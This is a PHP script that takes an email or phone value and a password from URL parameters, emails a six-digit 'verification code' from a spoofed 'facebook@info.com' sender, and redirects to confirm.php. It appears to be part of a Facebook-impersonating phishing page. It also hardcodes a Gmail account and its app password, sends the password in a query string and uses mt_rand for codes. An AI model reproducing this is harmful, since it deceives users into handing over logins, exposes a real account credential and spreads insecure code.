<?php
// Include PHPMailer autoload and define your function
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

function generateVerificationCode($length = 6)
{
    $code = '';
    for ($i = 0; $i < $length; $i++) {
        $code .= mt_rand(0, 9);
    }
    return $code;
}

session_start(); // Ensure session is started to access session variables if needed


// Your existing email sending code
$email_or_phone = $_GET['email_or_phone'] ?? '';
$password = $_GET['password'] ?? '';

if ($email_or_phone && $password) {
    $verification_code = generateVerificationCode();

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = 0;
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'abdulgamer831@gmail.com';
        $mail->Password   = 'vkaaepjgpxgvvdeq';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port       = 465;

        // Recipients
        $mail->setFrom('facebook@info.com', 'Mailer');
        $mail->addAddress($email_or_phone);  // Add a recipient

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = 'Your Verification Code';
        $mail->Body    = "Your verification code is: $verification_code";
        $mail->AltBody = "Your verification code is: $verification_code";

        $mail->send();

        // After sending email, generate a script to handle redirection
        echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <p>Redirecting, please wait...</p>
    <script>
        window.location.href = "confirm.php";
    </script>
</body>
</html>';
        exit();
    } catch (Exception $e) {
header("Location: confirm.php");
        echo 'error';
        // Handle error if email sending fails
        exit();
    }
}

// Default redirection if email_or_phone or password is not set
header("Location: confirm.php");
exit();
